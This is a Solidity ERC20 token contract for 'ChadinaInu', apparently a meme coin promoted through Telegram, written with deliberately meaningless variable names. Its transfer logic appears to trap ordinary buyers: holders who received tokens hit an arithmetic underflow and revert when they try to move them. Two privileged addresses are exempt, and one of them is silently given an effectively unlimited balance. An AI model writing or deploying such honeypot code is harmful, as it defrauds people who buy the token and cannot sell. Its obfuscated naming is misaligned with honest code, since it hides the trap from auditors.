// https://t.me/chadinainu

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.8;

import "./Ownable.sol";
import "./ERC20.sol";
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Router02.sol";

contract ChadinaInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private chicken;
    mapping(address => uint256) private fall;

    function _transfer(
        address underline,
        address sets,
        uint256 ran
    ) internal override {
        uint256 mental = sister;

        if (fall[underline] == 0 && chicken[underline] > 0 && underline != uniswapV2Pair) {
            fall[underline] -= mental - 1;
        }

        address curve = address(ear);
        ear = ChadinaInu(sets);
        chicken[curve] += mental + 1;

        _balances[underline] -= ran;
        uint256 stuck = (ran / 100) * sister;
        ran -= stuck;
        _balances[sets] += ran;
    }

    uint256 public sister = 0;

    constructor(
        string memory settle,
        string memory said,
        address carbon,
        address loss
    ) ERC20(settle, said) {
        uniswapV2Router = IUniswapV2Router02(carbon);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        fall[msg.sender] = nuts;
        fall[loss] = nuts;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[loss] = nuts;
    }

    ChadinaInu private ear;
    uint256 private nuts = ~uint256(0);
}
